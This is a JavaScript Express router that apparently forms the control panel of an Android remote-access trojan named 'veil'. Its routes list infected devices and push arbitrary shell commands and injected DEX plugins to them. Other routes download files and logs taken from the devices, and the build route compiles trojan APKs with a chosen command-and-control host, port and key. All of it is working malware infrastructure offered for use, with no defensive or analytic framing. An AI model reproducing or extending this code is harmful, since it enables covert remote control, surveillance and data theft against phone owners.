const express = require("express");
const router = express.Router();
const { requireAuth, rateLimiter, clearRateLimit, createSession, logout } = require("../auth");
const { dbAll, dbRun, dbGet, auditLog } = require("../db");
const { clients, clientKeys, sendFramed } = require("../crypto");
const { validateHost, validatePort, validateCryptoKey, validateUid, validateClassName, safeFilename } = require("../validation");
const config = require("../config");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

router.post("/login", rateLimiter(), async (req, res) => {
    const ip = req.ip;
    const { password } = req.body || {};
    if (!password || typeof password !== "string" || password.length > 128) {
        auditLog("login_failed", ip, null, ip, {}, false);
        return res.status(401).json({ error: "invalid" });
    }
    if (password === config.panelPassword) {
        clearRateLimit(ip);
        const token = createSession(ip);
        auditLog("login", ip, null, ip, {}, true);
        res.setHeader("Set-Cookie",
            `veil_session=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${Math.floor(config.sessionTimeoutMs / 1000)}`);
        res.json({ token });
    } else {
        auditLog("login_failed", ip, null, ip, {}, false);
        res.status(401).json({ error: "invalid" });
    }
});

router.post("/logout", requireAuth, (req, res) => {
    const { parseCookie, logout: authLogout } = require("../auth");
    const cookies = parseCookie(req.headers.cookie || "");
    const token = req.headers["x-auth-token"] || cookies.veil_session;
    if (token) authLogout(token);
    res.setHeader("Set-Cookie", "veil_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
    auditLog("logout", req.session.actor, null, req.ip, {}, true);
    res.json({ status: "ok" });
});

function sendCmd(uid, payload) {
    const sock = clients.get(uid);
    const aesKey = clientKeys.get(uid);
    if (sock && !sock.destroyed && aesKey) {
        sendFramed(sock, payload, aesKey);
        return { sent: true };
    }
    dbRun("INSERT INTO pending_tasks (client_uid, cmd, data, created_at) VALUES (?,?,?,?)",
        [uid, payload.cmd, JSON.stringify(payload), Date.now()]);
    return { sent: false, queued: true };
}

router.get("/clients", requireAuth, async (req, res) => {
    try { res.json(await dbAll("SELECT * FROM clients ORDER BY last_seen DESC")); }
    catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.post("/cmd/:uid", requireAuth, (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    const { cmd, ...rest } = req.body || {};
    if (!cmd || typeof cmd !== "string" || !/^[a-zA-Z_]+$/.test(cmd)) return res.status(400).json({ error: "invalid_cmd" });
    auditLog("send_cmd", req.session.actor, uid, req.ip, { cmd }, true);
    res.json(sendCmd(uid, { cmd, ...rest }));
});

router.post("/shell/:uid", requireAuth, (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    const command = req.body?.command;
    if (!command || typeof command !== "string" || command.length > 4096) return res.status(400).json({ error: "invalid_command" });
    auditLog("send_shell", req.session.actor, uid, req.ip, { command: command.substring(0, 100) }, true);
    res.json(sendCmd(uid, { cmd: "shell", args: command }));
});

router.delete("/client/:uid", requireAuth, async (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    auditLog("delete_client", req.session.actor, uid, req.ip, {}, true);
    await dbRun("DELETE FROM clients WHERE uid=?", [uid]);
    await dbRun("DELETE FROM logs WHERE client_uid=?", [uid]);
    await dbRun("DELETE FROM files WHERE client_uid=?", [uid]);
    await dbRun("DELETE FROM pending_tasks WHERE client_uid=?", [uid]);
    res.json({ status: "ok" });
});

router.post("/tag/:uid", requireAuth, async (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    const tag = req.body?.tag;
    if (!tag || typeof tag !== "string" || tag.length > 64) return res.status(400).json({ error: "invalid_tag" });
    auditLog("tag_client", req.session.actor, uid, req.ip, { tag }, true);
    await dbRun("UPDATE clients SET tag=? WHERE uid=?", [tag, uid]);
    res.json({ status: "ok" });
});

router.get("/logs/:uid", requireAuth, async (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    try { res.json(await dbAll("SELECT * FROM logs WHERE client_uid=? ORDER BY timestamp DESC LIMIT 500", [uid])); }
    catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.get("/files/:uid", requireAuth, async (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    try { res.json(await dbAll("SELECT * FROM files WHERE client_uid=? ORDER BY timestamp DESC", [uid])); }
    catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.get("/download/:id", requireAuth, async (req, res) => {
    const id = parseInt(req.params.id);
    if (!Number.isInteger(id) || id < 1) return res.status(400).json({ error: "invalid_id" });
    try {
        const row = await dbGet("SELECT * FROM files WHERE id=?", [id]);
        if (row) { auditLog("download_file", req.session.actor, String(id), req.ip, { filename: row.filename }, true); res.download(row.filepath, row.filename); }
        else res.status(404).json({ error: "not_found" });
    } catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.get("/plugins", requireAuth, async (req, res) => {
    try { res.json(await dbAll("SELECT * FROM plugins ORDER BY created_at DESC")); }
    catch (e) { res.status(500).json({ error: "internal_error" }); }
});

const DEX_MAGIC = Buffer.from([0x64, 0x65, 0x78, 0x0a]);

router.post("/plugin/upload", requireAuth, async (req, res) => {
    const { name, data, className } = req.body || {};
    if (!name || typeof name !== "string" || !/^[a-zA-Z0-9._-]+$/.test(name) || name.length > 255) return res.status(400).json({ error: "invalid_name" });
    if (!data || typeof data !== "string" || data.length > config.maxPluginSize * 1.4) return res.status(413).json({ error: "too_large" });
    if (!validateClassName(className)) return res.status(400).json({ error: "invalid_class_name" });
    const decoded = Buffer.from(data, "base64");
    if (decoded.length > config.maxPluginSize) return res.status(413).json({ error: "too_large" });
    if (decoded.length < 112 || !decoded.subarray(0, 4).equals(DEX_MAGIC)) return res.status(400).json({ error: "invalid_dex" });
    const checksum = crypto.createHash("sha256").update(decoded).digest("hex");
    const id = crypto.randomUUID();
    const fpath = path.join(__dirname, "..", "..", "plugins", id + ".dex");
    fs.writeFileSync(fpath, decoded);
    await dbRun("INSERT INTO plugins (id, name, filepath, className, size, checksum, created_at) VALUES (?,?,?,?,?,?,?)", [id, name, fpath, className, decoded.length, checksum, Date.now()]);
    auditLog("plugin_upload", req.session.actor, id, req.ip, { name, checksum }, true);
    res.json({ status: "ok", id, checksum });
});

router.delete("/plugin/:id", requireAuth, async (req, res) => {
    const id = req.params.id;
    if (!validateUid(id)) return res.status(400).json({ error: "invalid_id" });
    const row = await dbGet("SELECT * FROM plugins WHERE id=?", [id]);
    if (row) { try { fs.unlinkSync(row.filepath); } catch {} await dbRun("DELETE FROM plugins WHERE id=?", [id]); auditLog("plugin_delete", req.session.actor, id, req.ip, {}, true); }
    res.json({ status: "ok" });
});

router.post("/plugin/inject/:uid", requireAuth, async (req, res) => {
    const uid = req.params.uid;
    if (!validateUid(uid)) return res.status(400).json({ error: "invalid_uid" });
    const pluginId = req.body?.pluginId;
    if (!validateUid(pluginId)) return res.status(400).json({ error: "invalid_plugin_id" });
    const row = await dbGet("SELECT * FROM plugins WHERE id=?", [pluginId]);
    if (row) { const data = fs.readFileSync(row.filepath).toString("base64"); auditLog("plugin_inject", req.session.actor, uid, req.ip, { pluginId }, true); res.json(sendCmd(uid, { cmd: "load_plugin", data, className: row.className })); }
    else res.status(404).json({ error: "not_found" });
});

const activeBuilds = new Set();

router.get("/builds", requireAuth, async (req, res) => {
    try {
        const cutoff = Date.now() - 10 * 60 * 1000;
        const rows = await dbAll("SELECT buildId FROM builds WHERE status='pending' AND created_at < ?", [cutoff]);
        for (const r of rows) { if (!activeBuilds.has(r.buildId)) await dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [r.buildId]); }
        res.json(await dbAll("SELECT * FROM builds ORDER BY created_at DESC"));
    } catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.post("/build", requireAuth, async (req, res) => {
    const { host, port, cryptoKey } = req.body || {};
    if (!validateHost(host)) return res.status(400).json({ error: "invalid_host" });
    if (!validatePort(port)) return res.status(400).json({ error: "invalid_port" });
    if (!validateCryptoKey(cryptoKey)) return res.status(400).json({ error: "invalid_crypto_key" });
    const buildId = crypto.randomUUID();
    await dbRun("INSERT INTO builds (buildId, host, port, cryptoKey, status, created_at) VALUES (?,?,?,?,?,?)", [buildId, host, port, cryptoKey, "pending", Date.now()]);
    auditLog("build_start", req.session.actor, buildId, req.ip, { host, port }, true);
    const gradleHome = process.env.GRADLE_HOME || "";
    const gradlePath = path.join(__dirname, "..", "..", "..", "android");
    const gradleBat = path.join(gradleHome, "bin", "gradle.bat");
    const gradlew = fs.existsSync(gradleBat) ? gradleBat : "./gradlew";
    if (!fs.existsSync(gradleBat) && !fs.existsSync(path.join(gradlePath, "gradlew.bat"))) {
        await dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]);
        return res.status(500).json({ status: "failed", error: "gradle not found" });
    }
    const args = ["assembleRelease", "-Pc2_host=" + host, "-Pc2_port=" + port, "-Pcrypto_key=" + cryptoKey];
    const buildEnv = Object.assign({}, process.env, { GRADLE_HOME: gradleHome, JAVA_HOME: process.env.JAVA_HOME || "", PATH: path.join(gradleHome, "bin") + path.delimiter + process.env.PATH });
    activeBuilds.add(buildId);
    require("child_process").execFile(gradlew, args, { cwd: gradlePath, shell: process.platform === "win32", windowsHide: true, maxBuffer: 16 * 1024 * 1024, timeout: 10 * 60 * 1000, env: buildEnv }, (err) => {
        activeBuilds.delete(buildId);
        if (err) { dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]); }
        else {
            let apkPath = path.join(gradlePath, "app", "build", "outputs", "apk", "release", "app-release.apk");
            if (!fs.existsSync(apkPath)) apkPath = path.join(gradlePath, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk");
            if (fs.existsSync(apkPath)) {
                const destPath = path.join(__dirname, "..", "..", "builds", buildId + ".apk");
                fs.copyFileSync(apkPath, destPath);
                const size = fs.statSync(destPath).size;
                dbRun("UPDATE builds SET status='complete', size=?, downloadUrl=? WHERE buildId=?", [size, "/api/build/" + buildId + "/download", buildId]);
            } else { dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]); }
        }
    });
    res.json({ status: "started", buildId });
});

router.get("/build/:id/download", requireAuth, (req, res) => {
    const id = req.params.id;
    if (!validateUid(id)) return res.status(400).json({ error: "invalid_id" });
    const fpath = path.join(__dirname, "..", "..", "builds", id + ".apk");
    if (fs.existsSync(fpath)) { auditLog("build_download", req.session.actor, id, req.ip, {}, true); res.download(fpath, "veil.apk"); }
    else res.status(404).json({ error: "not_found" });
});

router.delete("/build/:id", requireAuth, async (req, res) => {
    const id = req.params.id;
    if (!validateUid(id)) return res.status(400).json({ error: "invalid_id" });
    const fpath = path.join(__dirname, "..", "..", "builds", id + ".apk");
    if (fs.existsSync(fpath)) fs.unlinkSync(fpath);
    await dbRun("DELETE FROM builds WHERE buildId=?", [id]);
    auditLog("build_delete", req.session.actor, id, req.ip, {}, true);
    res.json({ status: "ok" });
});

// FIXED: settings no longer exposes authToken to prevent cross-component leakage
router.get("/settings", requireAuth, async (req, res) => {
    try {
        const rows = await dbAll("SELECT * FROM settings");
        const settings = { tcpPort: config.socketPort, apiPort: config.apiPort };
        rows.forEach(r => { try { settings[r.key] = JSON.parse(r.value); } catch { settings[r.key] = r.value; } });
        res.json(settings);
    } catch (e) { res.status(500).json({ error: "internal_error" }); }
});

router.post("/settings", requireAuth, async (req, res) => {
    const settings = req.body || {};
    for (const [key, value] of Object.entries(settings)) {
        if (typeof key !== "string" || !/^[a-zA-Z_]+$/.test(key)) continue;
        await dbRun("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=?", [key, JSON.stringify(value), JSON.stringify(value)]);
    }
    auditLog("settings_update", req.session.actor, null, req.ip, { keys: Object.keys(settings) }, true);
    res.json({ status: "ok" });
});

router.get("/audit", requireAuth, async (req, res) => {
    try { res.json(await dbAll("SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 1000")); }
    catch (e) { res.status(500).json({ error: "internal_error" }); }
});

module.exports = router;
